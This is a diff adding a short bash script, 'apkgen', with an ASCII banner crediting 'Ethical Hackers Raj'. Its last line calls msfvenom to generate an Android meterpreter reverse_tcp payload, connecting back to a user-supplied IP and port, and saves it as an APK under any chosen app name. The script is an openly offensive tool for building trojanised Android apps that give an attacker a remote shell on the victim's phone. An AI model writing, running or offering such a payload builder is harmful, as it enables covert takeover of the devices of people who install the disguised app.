@@ -1,0 +1,37 @@
+#!/bin/bash
+clear
+#echo -e "\e[95m"  
+echo -e '\e[96m'
+echo -e " \e[1m"
+
+
+
+echo "================================================"
+echo "
+_          _     ____
+   / \   _ __ | | __/ ___| ___ _ __
+  / _ \ | '_ \| |/ / |  _ / _ \ '_ \
+ / ___ \| |_) |   <| |_| |  __/ | | |
+/_/   \_\ .__/|_|\_\\____|\___|_| |_|
+        |_|
+
+
+       ~~~~~~~~~~~~~~~~~~~~~~~~~
+      |  Ethical Hackers Raj  |
+       ~~~~~~~~~~~~~~~~~~~~~~~~~
+
+	Version - dev-1.0 "  
+
+
+
+echo "Usage:"
+echo "./apkgen <Your Ip> <Your Port> <AppName>"
+echo "==============================================="
+
+		
+
+if [ $# -eq 0 ] ; then
+    exit 1
+fi
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$1 LPORT=$2  > $3.apk
